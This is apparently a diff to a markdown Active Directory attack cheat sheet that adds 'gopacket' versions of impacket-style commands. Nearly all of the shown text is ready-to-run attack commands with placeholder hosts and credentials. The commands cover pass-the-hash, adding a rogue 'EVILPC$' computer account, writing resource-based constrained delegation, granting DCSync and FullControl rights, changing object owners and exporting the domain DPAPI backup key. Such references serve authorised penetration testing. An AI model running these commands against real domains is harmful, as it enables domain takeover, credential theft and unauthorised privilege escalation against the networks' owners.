+services -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10 list
+# gopacket — query status of a single service
+services DOMAIN/jdoe:Password123@192.168.1.10 status -name Spooler
+# gopacket — start / stop
+services DOMAIN/jdoe:Password123@192.168.1.10 start -name Spooler
+services DOMAIN/jdoe:Password123@192.168.1.10 stop  -name Spooler
 ```
 
 [↑ Back to Index](#index)
@@ -1877,6 +2078,14 @@ msldap "ldap+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.1/?proxytype=sock
 #     Workaround: -OutputFields '*' -OutputStyle List and grep/parse
 Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 "(objectClass=user)" -FollowReferrals
 Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 "(objectClass=computer)" -FollowReferrals
+
+# gopacket — enumerate AD users (requires -port 389)
+GetADUsers -all -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — enumerate AD computers (requires -port 389)
+GetADComputers -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+GetADUsers -all -dc-ip 192.168.1.1 -port 389 \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -1955,6 +2164,12 @@ Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
 # Titanis — S4U2self only
 Ldap query 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   "(userAccountControl|=TrustedForS4U2self)" -OutputFields * -FollowReferrals
+
+# gopacket — find all delegation types (requires -port 389)
+findDelegation -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+findDelegation -dc-ip 192.168.1.1 -port 389 \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -1990,6 +2205,13 @@ Ldap addcomputer 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Passwor
 Ldap addcomputer 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   -NewPassword Password123! -Ssl \
   'CN=EVILPC$,CN=Computers,DC=domain,DC=local'
+
+# gopacket — SAMR method (plain LDAP or no LDAPS; confirmed working with -Ssl flag on Titanis)
+addcomputer -method SAMR -computer-name EVILPC$ -computer-pass Password123 \
+  -dc-ip 192.168.1.1 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — LDAP method (requires -port 389; use -Ssl / -port 636 for LDAPS)
+addcomputer -method LDAP -computer-name EVILPC$ -computer-pass Password123 \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -2034,6 +2256,17 @@ rbcd.py -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
 # bloodyAD
 bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 set object TARGET$ \
   msDS-AllowedToActOnBehalfOfOtherIdentity -v '<SDDL>'
+
+# gopacket — set RBCD (write msDS-AllowedToActOnBehalfOfOtherIdentity; requires -port 389)
+rbcd -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
+# gopacket — pass-the-hash
+rbcd -delegate-from EVILPC$ -delegate-to TARGET$ -action write \
+  -dc-ip 192.168.1.1 -port 389 \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN.FQDN/jdoe@192.168.1.1
+# gopacket — read current RBCD value
+rbcd -delegate-to TARGET$ -action read \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/jdoe:Password123@192.168.1.1
 ```
 
 [↑ Back to Index](#index)
@@ -2074,6 +2307,22 @@ owneredit.py -action write -new-owner jdoe \
   -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
   DOMAIN/admin:AdminPass@192.168.1.1
 
+# gopacket — dacledit: read DACL on an object (requires -port 389)
+dacledit -action read -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/admin:AdminPass@192.168.1.1
+# gopacket — dacledit: grant DCSync rights
+dacledit -action write -rights DCSync \
+  -principal jdoe -target-dn "DC=domain,DC=local" \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/admin:AdminPass@192.168.1.1
+# gopacket — dacledit: grant FullControl
+dacledit -action write -rights FullControl \
+  -principal jdoe -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/admin:AdminPass@192.168.1.1
+# gopacket — owneredit: change owner (requires -port 389)
+owneredit -action write -new-owner jdoe \
+  -target-dn "CN=targetuser,CN=Users,DC=domain,DC=local" \
+  -dc-ip 192.168.1.1 -port 389 DOMAIN.FQDN/admin:AdminPass@192.168.1.1
+
 # Titanis — post-exploitation after ACE grant (force password reset)
 Kerb setpw -UserName jdoe -UserDomain DOMAIN -Kdc 192.168.1.1 -Password jdoePass \
   targetuser@DOMAIN NewPass123
@@ -2101,6 +2350,12 @@ bloodyAD -H 192.168.1.1 -d DOMAIN -u jdoe -p Password123 \
 # Titanis
 Ldap moduser 192.168.1.1 -UserName jdoe -UserDomain DOMAIN -Password Password123 \
   targetuser userAccountControl+=4194304
+
+# gopacket — enable / disable an account
+net DOMAIN/admin:Password123@192.168.1.1 user -enable  targetuser
+net DOMAIN/admin:Password123@192.168.1.1 user -disable targetuser
+# gopacket — pass-the-hash
+net -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/admin@192.168.1.1 user -enable targetuser
 ```
 
 [↑ Back to Index](#index)
@@ -2161,6 +2416,8 @@ CredCoerce 192.168.1.10 \\<relay-listener-ip>\share \
 ---
 
 ## 8. Certificates
+
+> **gopacket status:** No ADCS tools. Use certipy, Titanis `Cert`, or impacket for all certificate operations.
 
 ### Self-Signed PFX Generation
 
@@ -2323,6 +2580,12 @@ dpapi.py backupkeys -t DOMAIN/Administrator:Password123@192.168.1.1 --export
 
 # Step 1 — impacket pass-the-hash
 dpapi.py backupkeys -t DOMAIN/Administrator@192.168.1.1 --export \
+  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
+
+# Step 1 — gopacket (subcommand syntax: positional target after subcommand)
+dpapi backupkeys 'DOMAIN.FQDN/Administrator:Password123@192.168.1.1' --export
+# gopacket — pass-the-hash
+dpapi backupkeys 'DOMAIN.FQDN/Administrator@192.168.1.1' --export \
   -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
 
 # Step 1 — dump the domain backup key (NetExec; fetches automatically during --dpapi)
